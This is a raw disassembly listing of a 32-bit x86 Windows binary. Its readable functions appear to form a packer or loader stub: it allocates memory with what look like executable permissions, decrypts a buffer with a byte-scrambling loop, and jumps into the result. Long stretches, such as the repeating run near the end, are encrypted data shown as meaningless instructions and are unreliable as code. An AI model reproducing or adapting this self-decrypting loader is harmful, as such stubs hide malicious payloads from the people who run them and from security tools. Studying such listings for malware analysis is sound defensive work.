  421461:	and    al,0x52
  421463:	js     0x4214ce
  421465:	(bad)  
  421467:	dec    eax
  421468:	push   eax
  421469:	popa   
  42146a:	adc    dh,BYTE PTR [edi+0x3a1aaaf0]
  421470:	fwait
  421471:	test   BYTE PTR [ecx],0xed
  421474:	sar    BYTE PTR [edx+eax*4],0x53
  421478:	add    ch,BYTE PTR [ebp+0x343b369f]
  42147e:	mov    BYTE PTR [esi+0x3f],bl
  421481:	xor    esp,DWORD PTR [ebx]
  421483:	cmp    ebp,edx
  421485:	popa   
  421486:	inc    eax
  421487:	ficom  DWORD PTR [ecx+0x2c215b69]
  42148d:	add    esp,eax
  42148f:	inc    esi
  421490:	xor    edx,DWORD PTR [eax+0x6e213cce]
  421496:	push   esi
  421497:	data16 ds daa 
  42149a:	stos   BYTE PTR es:[edi],al
  42149b:	sahf   
  42149c:	jnp    0x421452
  42149e:	inc    edx
  42149f:	outs   dx,BYTE PTR ds:[esi]
  4214a0:	xchg   ebx,eax
  4214a1:	push   0x3df8cea3
  4214a6:	sbb    esi,DWORD PTR [esp+ebx*2]
  4214a9:	mov    ch,0x79
  4214ab:	sbb    BYTE PTR [edx],dh
  4214ad:	(bad)  
  4214ae:	or     al,0x50
  4214b0:	stos   DWORD PTR es:[edi],eax
  4214b1:	(bad)  ss:[esi+0x4f]
  4214b5:	sbb    al,0x32
  4214b7:	or     edx,DWORD PTR [ecx+0x4d]
  4214ba:	aad    0xaa
  4214bc:	add    al,0x13
  4214be:	(bad)  
  4214bf:	jmp    0x42148a
  4214c1:	adc    BYTE PTR [eax],cl
  4214c3:	aas    
  4214c4:	and    DWORD PTR [edx],0x33290c5b
  4214ca:	rol    bl,0x90
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x31349306
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x6c4a5b2d
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	push   DWORD PTR [ecx+0x1c]
  421830:	push   cs
  421831:	(bad)  [edi+edi*1-0x3c]
  421835:	lods   al,BYTE PTR ds:[esi]
  421836:	les    eax,FWORD PTR [ebp+0x4a]
  421839:	call   0x9e88dbd3
  42183e:	outs   dx,DWORD PTR gs:[esi]
  421840:	aas    
  421841:	les    ebp,FWORD PTR [eax+eax*8+0x6aa84a45]
  421848:	cmp    al,0x46
  42184a:	sahf   
  42184b:	(bad)  [edi+0x3f]
  42184e:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421855:	cmp    al,0x46
  421857:	sahf   
  421858:	(bad)  [edi+0x3f]
  42185b:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421862:	cmp    al,0x46
  421864:	sahf   
  421865:	(bad)  [edi+0x3f]
  421868:	les    ebp,FWORD PTR [eax+edi*1+0x64e84a45]
  42186f:	and    edi,esp
  421871:	nop
  421872:	fstp   st(3)
  421874:	or     DWORD PTR ss:[ebp+0x25064478],ecx
  42187b:	dec    ebx
  42187c:	push   0x4faef72e
  421881:	dec    edi
  421882:	mov    dh,0xc3
  421884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421885:	aaa    
  421886:	sub    eax,DWORD PTR [ebp-0xfd8a0b6]
  42188c:	mov    bl,0x0
  42188e:	dec    ebx
  42188f:	in     al,0xce
  421891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421892:	cmp    BYTE PTR gs:[ebp-0xfd0e3fc],bl
  421899:	std    
  42189a:	sub    esi,DWORD PTR [eax-0x69]
  42189d:	mov    WORD PTR [ebp+0x448d2e2a],gs
  4218a3:	xor    DWORD PTR [ebx-0x6c],ecx
  4218a6:	stc    
  4218a7:	outs   dx,DWORD PTR ds:[esi]
  4218a8:	aas    
  4218a9:	les    ebp,FWORD PTR [eax+eax*8-0xc10b5bb]
  4218b0:	rcr    BYTE PTR [edi],0xdd
  4218b3:	and    eax,0x548735fd
  4218b8:	push   edx
  4218b9:	dec    edi
  4218ba:	or     DWORD PTR [eax],edx
  4218bc:	clc    
  4218bd:	ss push ds
  4218bf:	sti    
  4218c0:	shl    DWORD PTR [ebp+0x60],1
  4218c3:	cmp    al,0x3e
  4218c5:	retf   0x2f1d
  4218c8:	shl    BYTE PTR [eax-0x2],1
  4218cb:	mov    esi,0x5a37d70c
  4218d0:	std    
  4218d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218d2:	test   al,0xbd
  4218d4:	fsub   st,st(2)
  4218d6:	inc    esi
  4218d7:	mov    dl,0x7f
  4218d9:	xchg   esp,eax
  4218da:	fwait
  4218db:	xchg   edi,eax
  4218dc:	lods   eax,DWORD PTR ds:[esi]
  4218dd:	into   
  4218de:	out    0x40,al
  4218e0:	push   esp
  4218e1:	inc    eax
  4218e2:	mov    ds:0xd44cae92,al
  4218e7:	pop    ebp
  4218e8:	outs   dx,BYTE PTR ds:[esi]
  4218e9:	xor    eax,0x4f52549c
  4218ee:	or     DWORD PTR [eax],edx
  4218f0:	stc    
  4218f1:	outs   dx,BYTE PTR ss:[esi]
  4218f3:	addr16 dec edi
  4218f5:	sbb    BYTE PTR gs:[esp+ebp*1],0xca
  4218fa:	or     BYTE PTR [edx+0x2364607a],dh
  421900:	mov    ds:0x56c767d7,eax
  421905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421906:	cwde   
  421907:	and    BYTE PTR [edx-0x1e],al
  42190a:	sub    ah,al
  42190c:	aam    0x94
  42190e:	test   DWORD PTR [edx],ecx
  421910:	xor    dh,cl
  421912:	out    dx,al
  421913:	cmp    bh,dl
  421915:	inc    eax
  421916:	mov    edx,0xdd2e5f03
  42191b:	and    eax,0xacc435fd
  421920:	rol    BYTE PTR [ebp+0x4a],0xe8
  421924:	push   0x3c
  421926:	push   ss
  421927:	fcmovnu st,st(5)
  421929:	outs   dx,DWORD PTR ds:[esi]
  42192a:	jae    0x4218f1
  42192c:	scas   al,BYTE PTR es:[edi]
  42192d:	shl    ch,0x9a
  421930:	and    DWORD PTR ds:0xdd9e463c,0x6f
  421937:	aas    
  421938:	les    ebp,FWORD PTR [eax+eiz*1+0x61e94945]
  42193f:	cmp    eax,0x81dd9e4c
  421944:	cmp    eax,esp
  421946:	lods   al,BYTE PTR ds:[esi]
  421947:	jl     0x42198c
  421949:	dec    edx
  42194a:	call   0x8f8855b9
  42194f:	pusha  
  421950:	outs   dx,DWORD PTR ds:[esi]
  421951:	aas    
  421952:	les    edi,FWORD PTR [eax+eax*8+0x6fe84a45]
  421959:	cmp    al,0x46
  42195b:	sahf   
  42195c:	pushf  
  42195d:	outs   dx,DWORD PTR ds:[esi]
  42195e:	aas    
  42195f:	aam    0xac
  421961:	rol    BYTE PTR [ebp+0x48],0xe8
  421965:	push   0x39
  421967:	inc    esi
  421968:	lahf   
  421969:	(bad)  [edi+0x3f]
  42196c:	les    ebp,FWORD PTR [ebp+eax*8+0x6ae84b45]
  421973:	cmp    al,0x46
  421975:	sahf   
  421976:	fnstsw WORD PTR [edi]
  421978:	xor    eax,esp
  42197a:	lods   al,BYTE PTR ds:[esi]
  42197b:	les    eax,FWORD PTR [ebp+0x4a]
  42197e:	jmp    0x9c885311
  421983:	(bad)  [edi-0x41]
  421986:	les    ebp,FWORD PTR [eax+edx*8+0x6af84a45]
  42198d:	cmp    al,0x46
  42198f:	sahf   
  421990:	int    0x6f
  421992:	aas    
  421993:	aam    0xac
  421995:	rol    BYTE PTR [ebp+0x4a],0xe8
  421999:	push   0x2c
  42199b:	inc    esi
  42199c:	sahf   
  42199d:	(bad)  [edi+0x3f]
  4219a0:	les    ebp,FWORD PTR [eax+eax*8-0x6117b5bb]
  4219a7:	add    eax,0x6cb49e4a
  4219ac:	aas    
  4219ad:	les    ebp,FWORD PTR [eax+esi*1+0x23a74a4e]
  4219b4:	cmp    al,0x46
  4219b6:	sahf   
  4219b7:	(bad)  [edi+0x3f]
  4219ba:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  4219c1:	cmp    al,0x46
  4219c3:	sahf   
  4219c4:	(bad)  [edi+0x3f]
  4219c7:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  4219ce:	cmp    al,0x46
  4219d0:	sahf   
  4219d1:	(bad)  [edi+0x3f]
  4219d4:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  4219db:	cmp    al,0x46
  4219dd:	sahf   
  4219de:	(bad)  [edi+0x3f]
  4219e1:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  4219e8:	cmp    al,0x46
  4219ea:	sahf   
  4219eb:	(bad)  [edi+0x3f]
  4219ee:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  4219f5:	cmp    al,0x46
  4219f7:	sahf   
  4219f8:	(bad)  [edi+0x3f]
  4219fb:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421a02:	cmp    al,0x46
  421a04:	sahf   
  421a05:	(bad)  [edi+0x3f]
  421a08:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421a0f:	cmp    al,0x46
  421a11:	sahf   
  421a12:	(bad)  [edi+0x3f]
  421a15:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421a1c:	cmp    al,0x46
  421a1e:	mov    al,0xa9
  421a20:	or     al,BYTE PTR [edi-0x50]
  421a23:	lods   al,BYTE PTR ds:[esi]
  421a24:	rol    BYTE PTR [ebp+0x4a],0x8
  421a28:	popa   
  421a29:	cmp    al,0x46
  421a2b:	mov    ds,ebp
  421a2d:	outs   dx,DWORD PTR ds:[esi]
  421a2e:	aas    
  421a2f:	adc    BYTE PTR [eax-0x17b1ba40],ch
  421a35:	push   0x6c
  421a37:	add    ebx,ebp
  421a39:	out    dx,eax
  421a3a:	cmp    esi,DWORD PTR [eax-0x3c]
  421a3d:	lods   al,BYTE PTR ds:[esi]
  421a3e:	rol    BYTE PTR [ebp+0x4a],0xe8
  421a42:	dec    edx
  421a43:	cmp    al,0x46
  421a45:	jle    0x421a3a
  421a47:	sbb    eax,0xc0cfb64c
  421a4c:	inc    ebp
  421a4d:	dec    edx
  421a4e:	call   0x9e88565d
  421a53:	sub    eax,0xf6c43f64
  421a58:	rol    BYTE PTR [ebp+0x4a],0x30
  421a5c:	outs   dx,BYTE PTR ds:[esi]
  421a5d:	cmp    al,0x46
  421a5f:	sahf   
  421a60:	(bad)  [edi+0x3f]
  421a63:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421a6a:	sbb    al,0x46
  421a6c:	sahf   
  421a6d:	cmp    eax,0xacc43f6f
  421a72:	rol    BYTE PTR [ebp+0x4a],0xe8
  421a76:	push   0x3c
  421a78:	inc    esi
  421a79:	sahf   
  421a7a:	(bad)  [edi+0x3f]
  421a7d:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421a84:	cmp    al,0x46
  421a86:	sahf   
  421a87:	(bad)  [edi+0x3f]
  421a8a:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421a91:	cmp    al,0x46
  421a93:	sahf   
  421a94:	(bad)  [edi+0x3f]
  421a97:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421a9e:	cmp    al,0x46
  421aa0:	sahf   
  421aa1:	(bad)  [edi+0x3f]
  421aa4:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421aab:	cmp    al,0x46
  421aad:	sahf   
  421aae:	(bad)  [edi+0x3f]
  421ab1:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421ab8:	cmp    al,0x46
  421aba:	sahf   
  421abb:	(bad)  [edi+0x3f]
  421abe:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421ac5:	cmp    al,0x46
  421ac7:	sahf   
  421ac8:	(bad)  [edi+0x3f]
  421acb:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421ad2:	cmp    al,0x46
  421ad4:	sahf   
  421ad5:	(bad)  [edi+0x3f]
  421ad8:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421adf:	cmp    al,0x46
  421ae1:	sahf   
  421ae2:	(bad)  [edi+0x3f]
  421ae5:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421aec:	cmp    al,0x46
  421aee:	sahf   
  421aef:	(bad)  [edi+0x3f]
  421af2:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421af9:	cmp    al,0x46
  421afb:	sahf   
  421afc:	(bad)  [edi+0x3f]
  421aff:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b06:	cmp    al,0x46
  421b08:	sahf   
  421b09:	(bad)  [edi+0x3f]
  421b0c:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b13:	cmp    al,0x46
  421b15:	sahf   
  421b16:	(bad)  [edi+0x3f]
  421b19:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b20:	cmp    al,0x46
  421b22:	sahf   
  421b23:	(bad)  [edi+0x3f]
  421b26:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b2d:	cmp    al,0x46
  421b2f:	sahf   
  421b30:	(bad)  [edi+0x3f]
  421b33:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b3a:	cmp    al,0x46
  421b3c:	sahf   
  421b3d:	(bad)  [edi+0x3f]
  421b40:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b47:	cmp    al,0x46
  421b49:	sahf   
  421b4a:	(bad)  [edi+0x3f]
  421b4d:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b54:	cmp    al,0x46
  421b56:	sahf   
  421b57:	(bad)  [edi+0x3f]
  421b5a:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b61:	cmp    al,0x46
  421b63:	sahf   
  421b64:	(bad)  [edi+0x3f]
  421b67:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b6e:	cmp    al,0x46
  421b70:	sahf   
  421b71:	(bad)  [edi+0x3f]
  421b74:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b7b:	cmp    al,0x46
  421b7d:	sahf   
  421b7e:	(bad)  [edi+0x3f]
  421b81:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b88:	cmp    al,0x46
  421b8a:	sahf   
  421b8b:	(bad)  [edi+0x3f]
  421b8e:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421b95:	cmp    al,0x46
  421b97:	sahf   
  421b98:	(bad)  [edi+0x3f]
  421b9b:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421ba2:	cmp    al,0x46
  421ba4:	sahf   
  421ba5:	(bad)  [edi+0x3f]
  421ba8:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421baf:	cmp    al,0x46
  421bb1:	sahf   
  421bb2:	(bad)  [edi+0x3f]
  421bb5:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421bbc:	cmp    al,0x46
  421bbe:	sahf   
  421bbf:	(bad)  [edi+0x3f]
  421bc2:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421bc9:	cmp    al,0x46
  421bcb:	sahf   
  421bcc:	(bad)  [edi+0x3f]
  421bcf:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421bd6:	cmp    al,0x46
  421bd8:	sahf   
  421bd9:	(bad)  [edi+0x3f]
  421bdc:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421be3:	cmp    al,0x46
  421be5:	sahf   
  421be6:	(bad)  [edi+0x3f]
  421be9:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421bf0:	cmp    al,0x46
  421bf2:	sahf   
  421bf3:	(bad)  [edi+0x3f]
  421bf6:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421bfd:	cmp    al,0x46
  421bff:	sahf   
  421c00:	(bad)  [edi+0x3f]
  421c03:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421c0a:	cmp    al,0x46
  421c0c:	sahf   
  421c0d:	(bad)  [edi+0x3f]
  421c10:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421c17:	cmp    al,0x46
  421c19:	sahf   
  421c1a:	(bad)  [edi+0x3f]
  421c1d:	les    ebp,FWORD PTR [eax+eax*8+0x6ae84a45]
  421c24:	cmp    al,0x46
  421c26:	sahf   
  421c27:	(bad)  [edi+0x3f]
  421c2a:	les    ebp,FWORD PTR [eax+eax*8+0x61402545]
  421c31:	cmp    al,0x69
  421c33:	sahf   
  421c34:	fnstsw WORD PTR [edi+0x3f]
  421c37:	les    eax,FWORD PTR [esi-0x71c4609e]
  421c3d:	xchg   ebp,eax
  421c3e:	adc    eax,ebx
  421c40:	sbb    DWORD PTR [ebp-0x40d3f67e],ecx
  421c46:	je     0x421c18
  421c48:	sub    al,0x99
  421c4a:	out    dx,al
  421c4b:	push   bp
  421c4d:	das    
  421c4e:	push   0x79
  421c50:	push   edx
  421c51:	and    BYTE PTR [esi],ah
  421c53:	inc    ecx
  421c54:	and    DWORD PTR [edx+ecx*4-0x6],0x3
  421c59:	jg     0x421c08
  421c5b:	xchg   edx,eax
  421c5c:	fisubr WORD PTR [eax]
  421c5e:	out    0xac,al
  421c60:	out    0xe2,eax
  421c62:	ret    0x3bbd
  421c65:	push   ecx
  421c66:	out    dx,eax
  421c67:	lods   al,BYTE PTR ds:[esi]
  421c68:	loopne 0x421c1c
  421c6a:	sub    esi,DWORD PTR [ebp-0x34]
  421c6d:	iret   
  421c6e:	fwait
  421c6f:	outs   dx,BYTE PTR ds:[esi]
  421c70:	push   ebx
  421c71:	es out dx,eax
  421c73:	xor    DWORD PTR [ecx+0x2b35f125],0xffffffc8
  421c7a:	loopne 0x421c62
  421c7c:	inc    ebp
  421c7d:	sbb    eax,eax
  421c7f:	adc    DWORD PTR [ebx],eax
  421c81:	out    0x9b,al
  421c83:	ds jl  0x421c90
  421c86:	sbb    eax,0x75376c86
  421c8b:	jmp    0x421cf3
  421c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c8e:	cdq    
  421c8f:	imul   ebp,ebp,0xe148af0c
  421c95:	mov    ch,0x2b
  421c97:	arpl   WORD PTR [edx],cx
  421c99:	call   0x8f17:0xc43ab252
  421ca0:	dec    ebx
  421ca1:	jmp    ebp
  421ca3:	push   ecx
  421ca4:	mov    bh,0xd8
  421ca6:	xchg   BYTE PTR [eax],al
  421ca8:	and    ah,BYTE PTR [esi+0x53ea7d46]
  421cae:	icebp  
  421caf:	je     0x421c37
  421cb1:	pop    edi
  421cb2:	gs push edx
  421cb4:	in     al,0xc0
  421cb6:	pusha  
  421cb7:	inc    edx
  421cb8:	xor    eax,0xc556881
  421cbd:	(bad)
  421cc0:	das    
  421cc1:	xor    bl,BYTE PTR [ecx]
  421cc3:	cmc    
  421cc4:	sub    eax,0xed114263
  421cc9:	mov    bh,0x40
  421ccb:	cmp    esp,DWORD PTR fs:[esi*8-0x30da8d68]
